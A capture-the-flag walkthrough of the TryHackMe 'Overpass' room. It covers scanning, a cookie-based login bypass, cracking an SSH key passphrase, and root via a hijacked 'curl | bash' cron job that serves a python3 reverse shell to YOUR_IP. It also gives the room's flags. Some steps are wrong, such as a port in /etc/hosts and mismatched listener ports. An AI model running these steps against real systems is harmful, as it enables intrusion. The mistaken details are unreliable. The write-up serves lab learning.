13.09.2020 | Felix Strobel ([relevant](https://tryhackme.com/p/relevant))

# Overpass

  - [Task 1](#task-1)

## Task 1

<i>To get some informations about the system we can make a simple [nmap](https://nmap.org) scan. Using the `-sC` flag to use the default scripts and the `-sV` flag to determine versions of the services.<br>
The full command looks like this: `nmap -sC -sV MACHINE_IP`<br>
After scanning we can see a ssh and an http service running.</i>

<pre>
PORT   STATE SERVICE VERSION
22/tcp open  <b>ssh</b>     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  <b>http</b>    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre>

<i>Looking at the website does show us a link to a download page and gives us the possibility to download the source code. Now we can make a simple [gobuster](https://github.com/OJ/gobuster) scan for good practive and to be sure we did not missed any important informations. We will use the `-u` to specify our target and the `-w` to specify a wordlist. I am using the [`common.txt`](https://gitlab.com/kalilinux/packages/dirb/-/blob/kali/master/wordlists/common.txt).<br>
The full command looks like this: `gobuster dir -u "http://MACHINE_IP" -w ./common.txt`<br>
When the scan finsihes we see a `/admin` directory we haven't seen before.</i>

<pre>
/aboutus (Status: 301)
<b>/admin</b> (Status: 301)
/css (Status: 301)
/downloads (Status: 301)
/img (Status: 301)
/index.html (Status: 301)
</pre>

<i>Looking at it shows us a login form. With having a look on the source code we can see a `login.js` file which is loaded when the `body` element is loaded. When searching in the `login.js` file for a vulnerability we can recognize that the `SessionToken` cookie has to be set and there is no validation. We can open our webbrowser and open the developer console and switch to the Application tab. Under cookies we can create our own one and name it `SessionToken`. The value does not matter. Then we can reload the page and see that we are 'logged' in. The webpage shows us now a ssh private key.</i>

<pre>
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
</pre>

<i>Lets safe this key on our machine as `id_rsa`. But now we need a password for the key. We will use [`ssh2john.py`](https://www.openwall.com/john) to create a hash.<br>
The full command looks like this: `python ./ssh2john.py ./id_rsa > id_rsa.hash`<br>
Great, now we can use [`john`](https://www.openwall.com/john) to crack the hash. To specify we use the `--wordlist` flag. Our wordlist will be the [`rockyou.txt`](https://gitlab.com/kalilinux/packages/wordlists/-/blob/kali/master/rockyou.txt.gz).<br>
The full command looks likethis: `john --wordlist=./rockyou.txt id_rsa.hash`<br>
John returns us the following and presents the cracked password.</i>

<pre>
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 12 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
<b>james13</b>          (./id_rsa)
1g 0:00:00:02 DONE (2020-09-13 11:07) 0.4347g/s 6235Kp/s 6235Kc/s 6235KC/s  0125457423 ..*7¡Vamos!
Session completed
</pre>

<i>Now we have a ssh key and the password. Before logging in with: `ssh -i ./id_rsa james@MACHINE_IP` we have to set the permissions on the `id_rsa` file using `chmod 600 id_rsa`. And here we go we are logged in as james. And in the home directory we can find the `ùser.txt` file.</i>

1. Hack the machine and get the flag in `user.txt`.<br>
   `thm{65c1aaf000506e56996822c6281e6bf7}`

<i>In the home directory we can also find a `.overpass` file and we can `cat` it out.</i>

<pre>[{"name":"System","pass":"saydrawnlyingpicture"}]</pre>

<i>Did he really stored his root password here? Trying switcing the user to root does not work. Lokking at the `/etc/crontab` file shows us a a cronjob runnig as root.</i>

<pre>
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * <b>root curl overpass.thm/downloads/src/buildscript.sh | bash</b>
</pre>

<i>Ok he tries to fetch a file from overpass.thm. Maybe we can change the overpass.thm to point to our ip adress. To do so we have to edit the `/etc/hosts` file using nano.<br>
The full command looks like this: `nano /etc/hosts`<br>
Then you have to edit the content to look like the following. The YOUR_IP should be your internal tryhackme adress.</i>

<pre>
127.0.0.1 localhost
127.0.1.1 overpass-prod
<b>YOUR_IP:8000 overpass.thm</b>
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</pre>

<i>That's done so let's move on and create a file called `buildscript.sh` in the folder structure `downloads/src/`. Create these folders depending to your server. Into the `buildscript.sh` we paste a reverse shell from [pentestmonkey.net](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).</i>

<pre>
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
</pre>

<i>Now we have to set up a smal server and a netcat listener.<br>
The server command: `sudo python3 -m http.server 80`<br>
The netcat listener: `nc -lnvp 8080`<br>
After some waiting our netcat listener catches the reverse shell. And we became root! We can `cat` the `root.txt`.</i>

2. Escalate your privileges and get the flag in `root.txt`.<br>
   `thm{7f336f8c359dbac18d54fdd64ea753bb}`
